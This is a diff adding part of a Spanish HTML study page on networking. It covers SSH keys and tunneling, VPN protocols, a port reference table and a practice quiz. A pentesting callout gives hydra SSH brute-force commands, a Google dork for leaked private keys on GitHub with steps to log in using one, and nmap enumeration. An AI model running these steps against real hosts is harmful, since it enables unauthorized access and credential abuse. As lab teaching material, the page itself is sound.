+<span class="k">eval</span> $(ssh-agent)
+<span class="k">ssh-add</span> ~/.ssh/id_ed25519</pre>
+      </div>
+
+      <div class="callout key">
+        <div class="callout-title">🔑 Ed25519 vs RSA</div>
+        <p><strong>Ed25519:</strong> curva elíptica Curve25519. Claves pequeñas (68 chars), más rápido, más seguro. Recomendado para nuevas claves.<br>
+        <strong>RSA:</strong> más compatible (sistemas legacy). Usa mínimo 4096 bits en 2024. Evita 1024/2048 bits.</p>
+      </div>
+    </div>
+
+    <div id="ssh-tunneling" class="tab-content">
+      <div class="code-block">
+        <div class="code-header"><span>bash — SSH tunneling</span><button class="copy-btn" onclick="copyCode(this)">copiar</button></div>
+        <pre><span class="c"># LOCAL PORT FORWARDING</span>
+<span class="c"># Acceder a puerto remoto como si fuera local</span>
+<span class="c"># Ej: servicio MySQL en server no expuesto al exterior</span>
+<span class="k">ssh</span> <span class="v">-L</span> <span class="n">3306</span>:localhost:<span class="n">3306</span> user@server
+<span class="c"># Ahora: mysql -h 127.0.0.1 -P 3306 = conecta al MySQL remoto</span>
+
+<span class="c"># REMOTE PORT FORWARDING</span>
+<span class="c"># Exponer puerto local a través del servidor remoto</span>
+<span class="c"># Útil cuando el cliente está detrás de NAT/firewall</span>
+<span class="k">ssh</span> <span class="v">-R</span> <span class="n">8080</span>:localhost:<span class="n">80</span> user@server
+<span class="c"># Ahora desde server: curl localhost:8080 = tu web local</span>
+
+<span class="c"># DYNAMIC PORT FORWARDING (SOCKS proxy)</span>
+<span class="c"># Todo el tráfico del browser pasa por el server SSH</span>
+<span class="k">ssh</span> <span class="v">-D</span> <span class="n">1080</span> user@server
+<span class="c"># Configura browser: SOCKS5 proxy → 127.0.0.1:1080</span>
+<span class="c"># Útil en CTFs para acceder a red interna del target</span></pre>
+      </div>
+
+      <div class="scenario">
+        <div class="scenario-title">📋 Caso de uso real</div>
+        <p>Tienes acceso SSH a un servidor en una red corporativa. El servidor de base de datos (PostgreSQL 5432) no está expuesto. Con local forwarding:</p>
+        <div class="code-block" style="margin-top:.5rem;">
+          <div class="code-header"><span>bash</span><button class="copy-btn" onclick="copyCode(this)">copiar</button></div>
+          <pre><span class="k">ssh</span> <span class="v">-L</span> <span class="n">5432</span>:db-server:<span class="n">5432</span> user@bastion
+<span class="c"># En otra terminal:</span>
+<span class="k">psql</span> <span class="v">-h</span> 127.0.0.1 <span class="v">-U</span> dbuser mydb  <span class="c"># conecta al DB remoto</span></pre>
+        </div>
+      </div>
+    </div>
+
+    <div id="ssh-pentest" class="tab-content">
+      <div class="callout hacker">
+        <div class="callout-title">🏴‍☠️ SSH en pentesting</div>
+        <div class="code-block">
+          <div class="code-header"><span>bash</span><button class="copy-btn" onclick="copyCode(this)">copiar</button></div>
+          <pre><span class="c"># Fuerza bruta con hydra</span>
+<span class="k">hydra</span> <span class="v">-l</span> admin <span class="v">-P</span> /usr/share/wordlists/rockyou.txt ssh://10.0.1.6
+
+<span class="c"># Múltiples usuarios</span>
+<span class="k">hydra</span> <span class="v">-L</span> users.txt <span class="v">-P</span> pass.txt ssh://10.0.1.6 <span class="v">-t</span> <span class="n">4</span>
+
+<span class="c"># Buscar claves privadas expuestas en web/git</span>
+<span class="c"># Google Dork: "BEGIN RSA PRIVATE KEY" site:github.com</span>
+<span class="c"># Si encuentras una, guárdala con permisos correctos:</span>
+<span class="k">chmod</span> <span class="n">600</span> id_rsa
+<span class="k">ssh</span> <span class="v">-i</span> id_rsa user@target
+
+<span class="c"># Enumerar algoritmos soportados</span>
+<span class="k">nmap</span> <span class="v">--script ssh2-enum-algos</span> 10.0.1.6
+
+<span class="c"># Verificar versión SSH (buscar CVEs)</span>
+<span class="k">nmap</span> <span class="v">-sV -p 22</span> 10.0.1.6</pre>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- VPN -->
+  <section id="vpn">
+    <div class="section-header">
+      <div class="section-icon" style="background:#2a1a4e">🔮</div>
+      <h2>VPN — Virtual Private Network</h2>
+      <span class="badge" style="background:rgba(188,140,255,.15);color:var(--purple)">Tunneling</span>
+    </div>
+
+    <table>
+      <thead><tr><th>Protocolo</th><th>Puerto</th><th>Características</th><th>Uso común</th></tr></thead>
+      <tbody>
+        <tr><td><strong>OpenVPN</strong></td><td><span class="port">1194 UDP</span></td><td>Open source, muy configurable, maduro</td><td>Corporativo, labs CTF</td></tr>
+        <tr><td><strong>WireGuard</strong></td><td><span class="port">51820 UDP</span></td><td>Moderno, ultra-rápido, código mínimo, kernel space</td><td>VPN personal, servidores</td></tr>
+        <tr><td><strong>IPSec/IKEv2</strong></td><td><span class="port">500/4500 UDP</span></td><td>Estándar enterprise, complejo</td><td>VPN corporativa, móviles</td></tr>
+        <tr><td><strong>L2TP/IPSec</strong></td><td><span class="port">1701 UDP</span></td><td>Legacy, doble encapsulación</td><td>Compatibilidad legacy</td></tr>
+      </tbody>
+    </table>
+
+    <div class="callout hacker">
+      <div class="callout-title">🏴‍☠️ VPN en plataformas de labs</div>
+      <div class="code-block">
+        <div class="code-header"><span>bash</span><button class="copy-btn" onclick="copyCode(this)">copiar</button></div>
+        <pre><span class="c"># TryHackMe / HackTheBox — conectar al lab</span>
+<span class="k">sudo</span> openvpn tryhackme.ovpn
+<span class="c"># Verifica con: ip route | grep tun0</span>
+<span class="c"># Tu IP en la red del lab: ip addr show tun0</span>
+
+<span class="c"># WireGuard — configurar interfaz</span>
+<span class="k">sudo</span> wg-quick <span class="k">up</span> wg0     <span class="c"># activar (requiere /etc/wireguard/wg0.conf)</span>
+<span class="k">sudo</span> wg-quick <span class="k">down</span> wg0   <span class="c"># desactivar</span>
+<span class="k">sudo</span> wg show             <span class="c"># estado de peers y tráfico</span></pre>
+      </div>
+    </div>
+
+    <div class="callout key">
+      <div class="callout-title">🔑 Split Tunneling</div>
+      <p>Configuración donde solo parte del tráfico va por la VPN. Ej: solo el tráfico a la red corporativa usa el túnel, el resto (YouTube, etc.) sale directo. Pros: menos carga en el servidor VPN. Contras: el ISP sigue viendo el tráfico no-tunelizado.</p>
+    </div>
+  </section>
+
+  <!-- PORTS -->
+  <section id="ports">
+    <div class="section-header">
+      <div class="section-icon" style="background:#0d2340">🔢</div>
+      <h2>Puertos — Referencia Rápida</h2>
+      <span class="badge" style="background:rgba(88,166,255,.15);color:var(--blue)">0 – 65535</span>
+    </div>
+
+    <div class="callout key">
+      <div class="callout-title">🔑 Rangos de puertos</div>
+      <ul>
+        <li><strong>0–1023:</strong> Well-known ports (reservados). Requieren privilegios root para abrirlos.</li>
+        <li><strong>1024–49151:</strong> Puertos registrados. Aplicaciones conocidas (MySQL 3306, PostgreSQL 5432, Redis 6379…)</li>
+        <li><strong>49152–65535:</strong> Puertos efímeros/dinámicos. El OS los asigna para conexiones salientes.</li>
+      </ul>
+    </div>
+
+    <input type="text" id="portSearch" placeholder="Buscar puerto o servicio..." class="search-bar" style="margin-bottom:1rem;" oninput="filterPorts(this.value)">
+
+    <table id="portsTable">
+      <thead><tr><th>Puerto</th><th>Protocolo</th><th>Servicio</th><th>Notas de seguridad</th></tr></thead>
+      <tbody id="portsTbody"></tbody>
+    </table>
+  </section>
+
+  <!-- QUIZ -->
+  <section id="quiz">
+    <div class="section-header">
+      <div class="section-icon" style="background:#3d0f0f">🎯</div>
+      <h2>Quiz de Práctica</h2>
+      <span class="badge" style="background:rgba(248,81,73,.15);color:var(--red)">Autoevaluación</span>
+    </div>
+
+    <div id="quizContainer"></div>
+    <div style="margin-top:1.5rem;padding:1rem;background:var(--bg2);border-radius:8px;border:1px solid var(--border);">
+      <div style="display:flex;justify-content:space-between;align-items:center;">
+        <span style="font-size:15px;font-weight:600;">Puntuación: <span id="scoreDisplay" style="color:var(--green)">0 / 10</span></span>
+        <button class="tab" onclick="resetQuiz()" style="font-size:13px;">Reiniciar quiz</button>
+      </div>
+      <div class="progress-bar" style="margin-top:.75rem;">
+        <div class="progress-fill" id="scoreBar" style="width:0%"></div>
+      </div>
+    </div>
+  </section>
+
+</main>
+
+<script>
+const portsData = [
+  [20,'TCP','FTP-DATA','FTP transferencia de datos. Texto plano. ⚠️'],
+  [21,'TCP','FTP','Control FTP. Credenciales en texto plano. ⚠️'],
+  [22,'TCP','SSH','Secure Shell. Cifrado. Prueba fuerza bruta.'],
+  [23,'TCP','Telnet','Texto plano total. Nunca en producción. ⚠️'],
+  [25,'TCP','SMTP','Email entre servidores. Sin auth por defecto. ⚠️'],
+  [53,'UDP/TCP','DNS','Domain Name System. Objetivo de ataques y enumeración.'],
+  [67,'UDP','DHCP Server','Asignación de IPs. Objetivo de starvation/rogue DHCP.'],
+  [68,'UDP','DHCP Client','Cliente DHCP.'],
+  [80,'TCP','HTTP','Web sin cifrar. Ver tráfico con MitM. ⚠️'],
+  [110,'TCP','POP3','Email texto plano. ⚠️'],
+  [139,'TCP','NetBIOS','Red Windows legacy. Objetivo de enumeración SMB.'],
+  [143,'TCP','IMAP','Email texto plano. ⚠️'],
+  [161,'UDP','SNMP','Gestión de red. Versiones 1/2c usan community string en plano.'],
+  [389,'TCP','LDAP','Directorio activo. Credenciales en plano. ⚠️'],
+  [443,'TCP','HTTPS','HTTP + TLS. Cifrado.'],
+  [445,'TCP','SMB','Compartir archivos Windows. EternalBlue, WannaCry.'],
+  [465,'TCP','SMTPS','SMTP + TLS (legacy).'],
+  [587,'TCP','SMTP Submission','SMTP + STARTTLS. Para clientes de email.'],
+  [636,'TCP','LDAPS','LDAP + TLS.'],
+  [993,'TCP','IMAPS','IMAP + TLS.'],
+  [995,'TCP','POP3S','POP3 + TLS.'],
+  [1433,'TCP','MSSQL','Microsoft SQL Server.'],
+  [1521,'TCP','Oracle DB','Base de datos Oracle.'],
+  [3306,'TCP','MySQL','Base de datos MySQL.'],
+  [3389,'TCP','RDP','Remote Desktop Windows. BlueKeep, brute force. ⚠️'],
+  [5432,'TCP','PostgreSQL','Base de datos PostgreSQL.'],
+  [5900,'TCP','VNC','Control remoto gráfico. Frecuentemente sin cifrado. ⚠️'],
+  [6379,'TCP','Redis','DB en memoria. Sin auth por defecto en versiones viejas. ⚠️'],
+  [8080,'TCP','HTTP alt','Web en puerto alternativo. Frecuente en desarrollo.'],
+  [8443,'TCP','HTTPS alt','HTTPS en puerto alternativo.'],
+  [27017,'TCP','MongoDB','Base de datos MongoDB. Sin auth por defecto. ⚠️'],
+];
+
+function renderPorts(data) {
+  const protoClass = p => p.includes('UDP') && p.includes('TCP') ? 'both' : p.includes('UDP') ? 'udp' : 'tcp';
+  document.getElementById('portsTbody').innerHTML = data.map(([port,proto,service,notes]) =>
+    `<tr><td><span class="port">${port}</span></td><td><span class="proto ${protoClass(proto)}">${proto}</span></td><td>${service}</td><td style="font-size:12px;color:var(--text2)">${notes}</td></tr>`
+  ).join('');
+}
+
+function filterPorts(q) {
+  const filtered = portsData.filter(([p,pr,s,n]) =>
+    String(p).includes(q) || s.toLowerCase().includes(q.toLowerCase()) || n.toLowerCase().includes(q.toLowerCase())
+  );
+  renderPorts(filtered);
+}
+
+renderPorts(portsData);
+
+// QUIZ
+const quizData = [
+  { q:'¿Qué protocolo usa FTP para la transferencia de datos?', opts:['UDP puerto 20','TCP puerto 20','TCP puerto 21','UDP puerto 21'], ans:1, exp:'FTP usa TCP puerto 20 para datos y TCP puerto 21 para control.' },
+  { q:'Un atacante envía ARP Replies falsos para interceptar tráfico. ¿Cómo se llama este ataque?', opts:['DNS Poisoning','DHCP Starvation','ARP Spoofing','BGP Hijacking'], ans:2, exp:'ARP Spoofing (o ARP Poisoning) asocia la MAC del atacante a la IP del gateway.' },
+  { q:'¿Qué mecanismo de defensa en switches previene el ARP Spoofing?', opts:['DHCP Snooping','Dynamic ARP Inspection (DAI)','Port Security','STP Guard'], ans:1, exp:'DAI valida los paquetes ARP contra la tabla de DHCP Snooping Binding.' },
+  { q:'En el flujo DORA de DHCP, ¿qué significa la "O"?', opts:['Origin','Offer','Order','Optional'], ans:1, exp:'DORA = Discover → Offer → Request → ACK' },
+  { q:'¿En qué se diferencia SFTP de FTPS?', opts:['SFTP usa TLS, FTPS usa SSH','SFTP es FTP sobre SSH, FTPS es FTP sobre TLS','Son exactamente iguales','SFTP usa UDP, FTPS usa TCP'], ans:1, exp:'SFTP = SSH File Transfer Protocol (completamente diferente a FTP). FTPS = FTP + TLS (extensión del FTP clásico).' },
+  { q:'¿Cuál es el propósito de DNSSEC?', opts:['Cifrar las consultas DNS','Firmar criptográficamente las respuestas DNS para validar integridad','Acelerar la resolución DNS','Bloquear transferencias de zona AXFR'], ans:1, exp:'DNSSEC agrega firmas digitales a los registros DNS para detectar manipulación, pero no cifra el contenido.' },
+  { q:'¿Qué hace Perfect Forward Secrecy (PFS) en TLS?', opts:['Evita que el servidor sea hackeado','Usa claves efímeras para que comprometer la clave privada no descifre sesiones pasadas','Acelera el handshake TLS','Elimina la necesidad de certificados'], ans:1, exp:'Con PFS, cada sesión usa un par de claves temporal (ECDHE). La clave privada del servidor no puede descifrar tráfico pasado.' },
+  { q:'¿Cuál es la diferencia principal entre POP3 e IMAP?', opts:['POP3 es más seguro que IMAP','POP3 descarga y borra del servidor, IMAP sincroniza y mantiene en servidor','POP3 usa TLS, IMAP no','IMAP es solo para móviles'], ans:1, exp:'POP3 = un dispositivo, descarga. IMAP = múltiples dispositivos, sincronización con el servidor.' },
+  { q:'¿Qué tipo de forwarding SSH usarías para navegar todo el tráfico a través de un servidor remoto?', opts:['Local Port Forwarding (-L)','Remote Port Forwarding (-R)','Dynamic Port Forwarding (-D, SOCKS proxy)','X11 Forwarding'], ans:2, exp:'Dynamic Forwarding (-D) crea un proxy SOCKS. Configuras el browser para usarlo y todo el tráfico pasa por el servidor SSH.' },
+  { q:'Un atacante con control de un AS anuncia prefijos IP que no le pertenecen. ¿Qué ataque es?', opts:['DNS Hijacking','BGP Hijacking','ARP Spoofing','IP Spoofing'], ans:1, exp:'BGP Hijacking: anunciar rutas falsas en BGP para redirigir tráfico de Internet a través del AS del atacante.' },
+];
+
+let answers = new Array(quizData.length).fill(null);
+let score = 0;
+
+function renderQuiz() {
+  document.getElementById('quizContainer').innerHTML = quizData.map((q, i) => `
+    <div class="quiz-card" id="qcard-${i}">
+      <div class="quiz-q">${i+1}. ${q.q}</div>
+      <div class="quiz-opts" id="qopts-${i}">
+        ${q.opts.map((o, j) => `<div class="quiz-opt" onclick="answerQ(${i},${j})" id="qopt-${i}-${j}">${o}</div>`).join('')}
+      </div>
+      <div class="quiz-feedback" id="qfb-${i}"></div>
+    </div>
+  `).join('');
+}
+
+function answerQ(qi, oi) {
+  if (answers[qi] !== null) return;
+  answers[qi] = oi;
+  const correct = quizData[qi].ans === oi;
+  if (correct) score++;
+
+  const opt = document.getElementById(`qopt-${qi}-${oi}`);
+  opt.classList.add(correct ? 'correct' : 'wrong');
+  if (!correct) {
+    document.getElementById(`qopt-${qi}-${quizData[qi].ans}`).classList.add('correct');
+  }
+
+  const fb = document.getElementById(`qfb-${qi}`);
+  fb.style.display = 'block';
+  fb.style.background = correct ? 'rgba(63,185,80,.1)' : 'rgba(248,81,73,.1)';
+  fb.style.border = `1px solid ${correct ? 'var(--green)' : 'var(--red)'}`;
+  fb.style.color = correct ? '#b0f0b8' : '#ffc6c4';
+  fb.textContent = (correct ? '✓ Correcto — ' : '✗ Incorrecto — ') + quizData[qi].exp;
+
+  document.getElementById('scoreDisplay').textContent = `${score} / ${quizData.length}`;
+  document.getElementById('scoreBar').style.width = `${(score/quizData.length)*100}%`;
+}
+
+function resetQuiz() {
+  answers = new Array(quizData.length).fill(null);
+  score = 0;
+  document.getElementById('scoreDisplay').textContent = `0 / ${quizData.length}`;
+  document.getElementById('scoreBar').style.width = '0%';
+  renderQuiz();
+}
+
+renderQuiz();
+
+// TABS
+function switchTab(group, name) {
+  document.querySelectorAll(`[id^="${group}-"]`).forEach(el => {
+    if (el.classList.contains('tab-content')) el.classList.remove('active');
+  });
+  document.getElementById(`${group}-${name}`).classList.add('active');
+  event.target.closest('.tabs').querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
+  event.target.classList.add('active');
+}
+
+// ACCORDION
+function toggleAcc(header) {
+  const body = header.nextElementSibling;
+  const arrow = header.querySelector('.acc-arrow');
+  body.classList.toggle('open');
+  arrow.classList.toggle('open');
+}
+
+// NAV active state
+const sections = document.querySelectorAll('section[id]');
+window.addEventListener('scroll', () => {
+  let curr = '';
+  sections.forEach(s => { if (window.scrollY >= s.offsetTop - 80) curr = s.id; });
+  document.querySelectorAll('nav a').forEach(a => {
+    a.classList.toggle('active', a.getAttribute('href') === '#' + curr);
+  });
+});
+
+// SEARCH
+function searchContent(q) {
+  if (!q) { sections.forEach(s => s.style.display = ''); return; }
+  q = q.toLowerCase();
+  sections.forEach(s => {
+    s.style.display = s.textContent.toLowerCase().includes(q) ? '' : 'none';
+  });
+}
+
+// COPY
+function copyCode(btn) {
+  const pre = btn.closest('.code-block').querySelector('pre');
+  navigator.clipboard.writeText(pre.textContent).then(() => {
+    btn.textContent = '✓';
+    setTimeout(() => btn.textContent = 'copiar', 1500);
+  });
+}
+</script>
+</body>
+</html>
